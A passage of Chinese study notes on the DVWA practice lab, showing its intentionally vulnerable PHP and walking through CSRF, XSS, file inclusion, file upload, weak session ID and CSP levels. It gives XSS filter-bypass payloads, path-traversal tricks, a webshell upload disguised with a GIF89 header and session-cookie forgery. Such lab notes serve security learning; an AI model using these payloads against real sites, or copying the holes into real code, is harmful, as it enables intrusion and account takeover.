		$html .= "<pre>Passwords did not match.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

原链接

http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#

构造链接输入：

http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=666&password_conf=666&Change=Change#

CSRF最关键的是利用受害者的cookie向服务器发送伪造请求

可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）

因为是本地搭建的环境，服务器域名是ip所以无法生成相应的短链接。实际攻击场景下，只要目标服务器的域名不是IP，是可以生成相应短链接的。

## medium

```php+HTML
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Checks to see where the request came from
	if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
		// Get input
		$pass_new  = $_GET[ 'password_new' ];
		$pass_conf = $_GET[ 'password_conf' ];

		// Do the passwords match?
		if( $pass_new == $pass_conf ) {
			// They do!
			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			$pass_new = md5( $pass_new );

			// Update the database
			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

			// Feedback for the user
			$html .= "<pre>Password Changed.</pre>";
		}
		else {
			// Issue with passwords matching
			$html .= "<pre>Passwords did not match.</pre>";
		}
	}
	else {
		// Didn't come from a trusted source
		$html .= "<pre>That request didn't look correct.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```



# 跨站脚本攻击（xss）

## 原理

通常指黑客通过HTML注入纂改了网页，插入恶意脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。

## 分类

XSS一般分为：

- 存储型：将用户输入的数据存储在服务器端。用户访问了带有xss得页面代码后，产生安全问题。
- 反射型：只是简单地把用户输入的数据反射给浏览器，简单来说，黑客往往需要用户诱使用户点击一个恶意链接，才能攻击成功。
- DOM型：通过修改页面的DOM节点形成的XSS。

存储型和反射型区别：是否有交互

易用性排序：存储型 > DOM型 > 反射型

## 反射型xss

### low

```php+HTML
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Feedback for end user
	$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

**`X-XSS-Protection:（）` 禁用xss过滤器**

此处if判断没有进行任何过滤，直接采用get方式输出了传入得$name。看到，代码直接采用get方式传入了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。最普通的测试payload:

<script>alert(/xss/)</script>

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220607203354289.png" alt="image-20220607203354289" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220607204020384.png" alt="image-20220607204020384" style="zoom:80%;" />

### medium

```php+HTML
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Get input
	$name = str_replace( '<script>', '', $_GET[ 'name' ] );

	// Feedback for end user
	$html .= "<pre>Hello ${name}</pre>";
}

?>
```

过滤了script标签，使用str_replace函数将输入中的script替换为空。可以使用事件类型标签绕过

①大小写绕过：

`<ScRipt>alert('xss')</ScRipt>`

②双写方式绕过str_replace()函数：

`<scr<script>ipt>alert('xss')</script>`

③使用非script标签的xss payload：

img标签：`<img src=1 onerror=alert('xss')>`

### high

```php+HTML
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Get input
	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

	// Feedback for end user
	$html .= "<pre>Hello ${name}</pre>";
}

?>
```

preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过

（正则表达式中i表示不区分大小写）不再有效，但依旧可以使用事件类型标签

`<img src=1 onerror=alert('xss')>`

## 存储型xss

### low

```php+HTML
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = stripslashes( $message );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitize name input
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>
```

`trim(string,charlist)` ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符

`stripslashes(string)`： 去除掉string字符的反斜杠＼

`mysqli_real_escape_string(string,connection)` ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。

`$GLOBALS` ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。

可以看出，low级别的代码对我们输入的message和name并没有进行XSS过滤，而且数据存储在数据库中，存在比较明显的存储型XSS漏洞

### medium

```php+HTML
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = strip_tags( addslashes( $message ) );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$message = htmlspecialchars( $message );

	// Sanitize name input
	$name = str_replace( '<script>', '', $name );
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>
```

strip_tags()函数去除html标签
htmlspecialchars（）函数，将预定义字符转换成html实体
str_replace()函数，转义函数，将指定的字符或字符串转换成别的字符，这里是将<script>转为空。缺点转义的时候区分大小写。

通过源码可以看出，对message的值进行了标签的过滤以及预定义符的转义。对name的值进行了转义。

### high

```php+HTML
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = strip_tags( addslashes( $message ) );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$message = htmlspecialchars( $message );

	// Sanitize name input
	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>

```

这个源码比中级别的多了一个过滤函数来过滤name的值，preg_replace()函数，进行正则表达式匹配防止大小写，多重输入字符绕过过滤函数。

## DOM型xss

### low

```php+HTML
<?php

# No protections, anything goes

?>
```

![image-20220608003451948](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608003451948.png)

DOM XSS 是通过修改页面的 DOM 节点形成的 XSS。首先通过选择语言后然后往页面中创建了新的 DOM 节点

```
document.write("" + $decodeURI(lang) + "");
document.write("----");
```

源码分析：

这里的lang变量通过document.location.href来获取到，并且没有任何过滤就直接URL解码后输出在了option标签中

![image-20220608010447762](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608010447762.png)



### mudium

```php+HTML
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
	$default = $_GET['default'];
	
	# Do not allow script tags
	if (stripos ($default, "<script") !== false) {
		header ("location: ?default=English");
		exit;
	}
}

?>
```

函数：

```
stripos() 	// 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）
header() 	// 函数向客户端发送原始的 HTTP 报头。
```

分析：

针对script字段进行了过滤，通过stripos()函数查找script 字符串在default变量中第一次出现的位置，如果匹配成功的话通过location将URL后面的参数修正为?default=English，同样这里可以通过其他的标签搭配事件类型来达到弹窗效果

可以看到，medium级别的代码先检查了default参数是否为空，如果不为空则将default等于获取到的default值。这里还使用了stripos 用于检测default值中是否有 <script  ，如果有的话，则将 default=English 。

很明显，这里过滤了 <script  (不区分大小写)，那么我们可以使用<img  src=1  οnerrοr=('hack')>

但是当我们访问URL：
![image-20220608010632863](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608010632863.png)

此时并没有弹出任何页面

我们查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，所以img标签并没有发起任何作用。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608013706839.png" alt="image-20220608013706839" style="zoom:80%;" />

我们得先闭合前面的标签，我们构造语句闭合option标签：

 `<option value='   " + lang + "   '> " + decodeURI(lang) + " <`/option>

所以，我们构造该链接：

![image-20220608012636538](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608012636538.png)

但是我们的语句并没有执行，于是我们查看源代码，发现我们的语句中只有 > 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608013851002.png" alt="image-20220608013851002" style="zoom:80%;" />

于是我们继续构造语句去闭合select标签，这下我们的img标签就是独立的一条语句了

我们构造该链接：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608012733739.png" alt="image-20220608012733739" />

我们查看源代码，可以看到，我们的语句已经插入到页面中了

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608013030519.png" alt="image-20220608013030519" style="zoom:80%;" />

### high

```php+HTML
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

	# White list the allowable languages
	switch ($_GET['default']) {
		case "French":
		case "English":
		case "German":
		case "Spanish":
			# ok
			break;
		default:
			header ("location: ?default=English");
			exit;
	}
}

?>
```

这里high级别的代码先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，我们的语句就没有可能插入到页面中了。目前我也没有找到好的方法进行XSS注入。

可以用&连接一个新的自定义变量来Bypass

```
&</option></select><img src=1 onerror=alert('hahaha')></option>
```

![image-20220608014230360](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608014230360.png)

也可以用#来Bypass

![image-20220608014312270](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608014312270.png)

# 文件包含漏洞（File Inclusion）

## 原理

是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。

## 分类

**本地文件包含**

通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行。
总的来说就是被包含的文件在服务器本地

**远程文件包含**

在远程服务器上预先设置好的脚本，然后攻击者利用该漏洞包含一个远程的文件，这种漏洞的出现是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码
简单的说就是被包含的文件在第三方服务器

## low

```php+HTML
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确实为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。

 构造url：`http://ip/filename?page=/a.txt`，可见成功读取文件内容

发现直接是使用get方法，没有任何过滤，那么直接文件包含即可

```
?page=../../phpinfo.php
```

![image-20220608015232333](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608015232333.png)

我们自己尝试一下：在同一目录下

E:\wangan\phpstudy_pro\WWW\DVWAmaster\vulnerabilities\fi）

创建b.php和c.txt,让b.php来包含c.txt

写一个简单的存在include()这个函数的PHP代码，用 id来当接受值：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608015613104.png" alt="image-20220608015613104" style="zoom:80%;" />![image-20220608015724554](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608015724554.png)

![image-20220608015724554](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608015724554.png)

![image-20220608015830134](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608015830134.png)

包含成功

## medium

```php+HTML
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?>
```

`str_replace()` 函数以其他字符替换字符串中的一些字符（区分大小写）

发现过滤了`http://`、`https://`、`../`、`..\`
那么我们可以用大小写绕过`http`和双写绕过`httphttp://://`
或者使用`..././..././`经过过滤最后还是`../../`

## high

```php+HTML
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
	// This isn't the page we want!
	echo "ERROR: File not found!";
	exit;
}

?>
```

`fnmatch()` 函数根据指定的模式来匹配文件名或字符串。

代码中使用了`fnmatch()`函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。
利用该特点，在Windows平台下可以使用file协议绕过防护策略。注意：fnmatch 函数适用于 PHP >= 4.3.0，因此 php 版本高于这个才能利用

# 文件上传漏洞（File Upload）

## 原理

大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。

## low

```php+HTML
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// Can we move the file to the upload folder?
	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
		// No
		$html .= '<pre>Your image was not uploaded.</pre>';
	}
	else {
		// Yes!
		$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
	}
}

?>
```

`basename(path,suffix)`
函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。
可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。
如果上传成功，则会提示  路径+succesfully uploaded! 如果上传失败，则会提示 Your image was not uploaded。
我们可以写一句话木马 1.php ，上传
<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608022603433.png" alt="image-20220608022603433" style="zoom:80%;" />

上传成功

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608022917602.png" alt="image-20220608022917602" style="zoom:80%;" />

## medium

```php+HTML
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

	// Is it an image?
	if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
		( $uploaded_size < 100000 ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
```

可以看到，服务器对上传文件的大小和类型做了限制。只允许上传小于 100000 字节并且文件type类型是image/jpeg或 image/png 的。

**方法一：抓包修改文件的type**

因为这里过滤的是文件的上传类型，而不是文件的后缀名

所以我们直接上传 1.php 的一句话木马

通过burpsuite抓包，默认type类型是application/octer-stream 

![image-20220608023457484](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608023457484.png)

我们将其类型改为 image/jpeg ，然后go上传，可以看到，已经上传成功！

![image-20220608023605447](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608023605447.png)

![image-20220608024229343](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608024229343.png)

## high

```php+HTML
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
		( $uploaded_size < 100000 ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
```

`strrpos(string , find ,start)`  查找find字符在string字符中的最后一次出现的位置，start参数可选，表示指定从哪里开始

 `substr(string,start,length)` 返回string字符中从start开始的字符串，length参数可选，表示返回字符的长度

 `strtolower(string)` 返回给定字符串的小写

 `getimagesize(string)` ：函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING级的错误。所以 getimagesize函数的作用是判断上传的文件是不是有效的图片

`move_uploaded_file（file,newlocal）` 函数表示把给定的文件移动到新的位置

 所以  $uploaded_ext  表示的是上传文件的后缀名 ，这里限制上传的文件的后缀名必须以 jpg 、jpeg　或　png　结尾，同时大小<100000，同时上传的文件必须是有效的图片格式（不只是以图片的格式结尾，而且文件内容是图片格式的）。

我们直接上传一句话木马，然后把文件名改为 1.jpg
发现上传不了，因为仅仅后缀是图片格式的还不行，文件内容必须还得是图片格式的。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608025149985.png" alt="image-20220608025149985" style="zoom:80%;" />

所以我们在文件头部加上了jpg格式的 GIF89 

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608025239456.png" alt="image-20220608025239456" style="zoom:80%;" />

在文件头部加了jpg格式的 GIF89 标识后成功上传！ 

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608025309160.png" alt="image-20220608025309160" style="zoom:80%;" />

# Weak Session IDs (弱会话)

## low

```php+HTML
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
	if (!isset ($_SESSION['last_session_id'])) {
		$_SESSION['last_session_id'] = 0;
	}
	$_SESSION['last_session_id']++;
	$cookie_value = $_SESSION['last_session_id'];
	setcookie("dvwaSession", $cookie_value);
}
?>
```

`setcookie()` 函数向客户端发送一个 HTTP cookie。如果用户 SESSION 中的 `last_session_id` 不存在就设为 0，生成 cookie 时就在 cookies 上 dvwaSessionId + 1。这种生成方式过分简单了，而且非常容易被伪造。

首先在网页生成 cookie，可以见到 cookie 的格式异常简单，“dvwaSession=” 再加上个 id 数字。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608030915160.png" alt="image-20220608030915160" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608030939496.png" alt="image-20220608030939496" style="zoom:80%;" />

我们对比每次生成后抓包发现，cookie值中只有session值会变化，后面的内容则不会变化

我们复制这段cookie

dvwaSession=2; PHPSESSID=bh2qf1c60edcd3il23olcm8q12; security=low

清除cookie缓存，退出火狐浏览器

再次火狐浏览器，按F12调出hackbar（需要提前安装），把URL和cookie复制进去，点击Excute


![image-20220608031256358](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608031256358.png)

没有输入账号密码直接登录了

## medium

```php+HTML
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
	$cookie_value = time();
//返回当前时间的 Unix 时间戳，并格式化为日期：
time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数
	setcookie("dvwaSession", $cookie_value);
}
?>
```

从服务器端的代码来看，将SessionID的值改成了当前的时间，看起来比low的随机了点，但是经过连续的收集后就很容易发现其中的规律。

说白了，和自增1没啥区别，说白了就是从1970年到现在的秒数，那不也是一秒一秒自增

点生成，抓包

![image-20220608031645614](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608031645614.png)

通过设置时间戳，可知诱骗受害者在某个时间点基进行点击

复制刚才的devwasession值 1654629390

打开时间戳(Unix timestamp)转换工具 - 在线工具 时间戳转换工具，把刚才复制的值粘贴进去，点击转换，就出来dvwa登录时间了

然后在下一行伪造一个靠后几分钟的时间，点击转换，出现新的值

![image-20220608032104972](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608032104972.png)

把新值在BP中修改，然后复制整个cookie

dvwaSession=1654629390; PHPSESSID=sh3mdc46sjqupfdp3jbe69g1cu; security=medium

再复制刚才访问的url http://localhost/DVWA-master/vulnerabilities/weak_id/



# 内容安全策略绕过（CSP Bypass）

## 原理

CSP(Content Security Policy，内容安全策略）是一种用来防止XSS攻击的手段，通过在头部Content-Security-Policy 的相关参数，来限制未知（不信任）来源的JavaScript脚本的执行，从而达到防止xss攻击的目的。一般的xss攻击，主要是通过利用函数过滤/转义输入中的特殊字符，标签，文本来应对攻击。CSP则是另外一种常用的应对XSS攻击的策略。其实质就是白名单机制，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。

## low

```php+HTML
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.

header($headerCSP);

# These might work if you can't create your own for some reason
# https://pastebin.com/raw/R570EE00
# https://www.toptal.com/developers/hastebin/raw/cezaruzeka

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
	<script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
	<p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
	<input size="50" type="text" name="include" value="" id="include" />
	<input type="submit" value="Include" />
</form>
';
```

从源代码中`$headerCSP`可以看出来，这里定义了几个受信任的站点，只能允许这几个站点的脚本才可以运行。当然不看源代码，直接看`http`头部也是可以的。

![image-20220608082816460](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608082816460.png)

pastebin 是个快速分享文本内容的网站，假如文本的内容是一段 JavaScript 代码，网页就会把该代码包含进来。

![image-20220608084354717](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608084354717.png)

![image-20220608084250755](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608084250755.png)

## 

```php+HTML
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// Disable XSS protections so that inline alert boxes will work
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
	" . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
	<p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
	<input size="50" type="text" name="include" value="" id="include" />
	<input type="submit" value="Include" />
</form>
';
```

# 前端攻击(JavaScript Attacks)

## 原理

JavaScript是一种基于对象和事件驱动的、并具有安全性能的脚本语言。是一种解释型语言（代码不需要进行预编译）。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的。

若是涉及到Cookie、Session等记录用户信息的脚本，应该通过外部引入方式，并且不能暴露文件路径，控制好文件访问权限，若被攻击者获取到重要脚本代码，则能伪造其他合法用户进行伪造。

## low

```php+HTML
<?php
$page[ 'body' ] .= <<<EOF
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var 